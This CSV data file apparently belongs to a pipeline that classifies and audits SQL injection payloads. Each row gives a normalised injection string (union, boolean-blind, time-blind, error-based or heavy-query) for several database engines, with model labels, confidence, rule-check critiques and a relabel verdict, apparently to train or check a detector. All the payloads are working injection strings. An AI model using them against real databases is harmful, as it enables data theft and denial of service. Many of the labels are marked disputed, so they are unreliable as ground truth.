id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
23557,"1"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""uquh"" = ""uquh",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""uquh"" = ""uquh",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
23558,"1, ( select 9100 = ( 'qqpjq'|| ( select case 9100 when 9100 then 1 else 0 end from rdb$database ) ||'qzvzq' ) )",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1, ( select 9100 = ( 'qqpjq'|| ( select case 9100 when 9100 then 1 else 0 end from rdb$database ) ||'qzvzq' ) )",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
23559,"1"" ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,"1"" ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",False,0,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload)
23560,"1"" ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"1"" ) ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal
23561,1'|| ( select 'dsjg' where 2402 = 2402 and 1947 = 7472--,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1'|| ( select 'dsjg' where 2402 = 2402 and 1947 = 7472--,False,0,boolean_blind,generic,Pattern match: 'and 1947 = 7472' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
23562,"1' ) as mgko where 1828 = 1828 and make_set ( 8403 = 8403,8899 ) --",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"1' ) as mgko where 1828 = 1828 and make_set ( 8403 = 8403,8899 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
23563,"1"" ) where 1807 = 1807",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) where 1807 = 1807",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
23564,"-1123' ) ) ) union all select 6735,6735,6735,6735,6735,6735,6735,6735#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-1123' ) ) ) union all select 6735,6735,6735,6735,6735,6735,6735,6735#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23565,"1%' ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"1%' ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
23566,"-7815' union all select 2638,2638,2638,2638,2638--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-7815' union all select 2638,2638,2638,2638,2638--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23567,1 ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,1 ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
23568,"1"" ) where 1212 = 1212 and 8475 = 5864",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,"1"" ) where 1212 = 1212 and 8475 = 5864",False,0,boolean_blind,generic,Pattern match: 'and 8475 = 5864' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
23569,"-7950 where 9619 = 9619 union all select 9619,9619,9619,9619--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-7950 where 9619 = 9619 union all select 9619,9619,9619,9619--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23570,"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
23571,-2036' ) or ( 8459 = 8459 ) *4906 and ( 'hjeu' = 'hjeu,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-2036' ) or ( 8459 = 8459 ) *4906 and ( 'hjeu' = 'hjeu,False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
23572,"1, ( select ( case when ( 5217 = 5217 ) then 1 else 5217* ( select 5217 from mysql.db ) end ) )",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1, ( select ( case when ( 5217 = 5217 ) then 1 else 5217* ( select 5217 from mysql.db ) end ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
23573,"-8923'+ ( select xgvz where 9858 = 9858 union all select 9858,9858,9858#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"-8923'+ ( select xgvz where 9858 = 9858 union all select 9858,9858,9858#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23574,"1"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""hsaw"" = ""hsaw",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,"1"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""hsaw"" = ""hsaw",False,0,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload)
23575,"1 where 8389 = 8389 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"1 where 8389 = 8389 union all select null,null,null,null,null,null,null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23576,"1"" ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ""kxws"" like ""kxws",time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1"" ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ""kxws"" like ""kxws",False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
23577,"1'|| ( select 'ycya' from dual where 3536 = 3536 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,"1'|| ( select 'ycya' from dual where 3536 = 3536 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",False,0,time_blind,oracle,Pattern match: 'randomblob (' → time_blind (P5); DB signature: oracle,heavy_query,oracle,contains 7+ digit number (DoS-style payload)
23578,"1"" ) where 9680 = 9680 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1"" ) where 9680 = 9680 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
23579,"-1772 ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 8904 = 8904",error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-1772 ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 8904 = 8904",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
23580,"1%"" ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"1%"" ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
23581,"1%"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""%"" = """,error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1%"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""%"" = """,False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
23582,1'+ ( select hett where 7228 = 7228,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,1'+ ( select hett where 7228 = 7228,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
23583,"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and 'idxa' = 'idxa",error_based,mssql,0.9,mssql_cast,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and 'idxa' = 'idxa",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
23584,"1"" ) ) rlike ( select ( case when ( 8179 = 1246 ) then 1 else 0x28 end ) ) and ( ( ""xxeu"" = ""xxeu",time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"1"" ) ) rlike ( select ( case when ( 8179 = 1246 ) then 1 else 0x28 end ) ) and ( ( ""xxeu"" = ""xxeu",False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
23585,-9072 ) as saot where 2278 = 2278 order by 1#,union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,-9072 ) as saot where 2278 = 2278 order by 1#,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
23586,select ( case when ( 1093 = 7693 ) then 1093 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,select ( case when ( 1093 = 7693 ) then 1093 else 1/ ( select 0 ) end ) --,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
23587,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
23588,"1%' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and '%' = '",error_based,mysql,0.9,exp_extract,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1%' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and '%' = '",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
23589,"1%"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""%"" = """,time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'time_blind' (P5),error_based,mysql,"1%"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""%"" = """,False,0,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
23590,"1' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'ymad' like 'ymad",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'ymad' like 'ymad",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
23591,"1' where 2202 = 2202 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1' where 2202 = 2202 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
23592,"1 ) where 3915 = 3915 union all select null,null,null,null#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"1 ) where 3915 = 3915 union all select null,null,null,null#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23593,"-7808"" ) ) as jgkk where 9230 = 9230 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,"-7808"" ) ) as jgkk where 9230 = 9230 or elt ( 1032 = 1032,3623 ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
23594,"-7514%"" ) ) ) or 2448 = 8797#",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,"-7514%"" ) ) ) or 2448 = 8797#",False,0,boolean_blind,generic,Pattern match: 'or 2448 = 8797' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
23595,"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23596,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) #",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) #",False,0,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload)
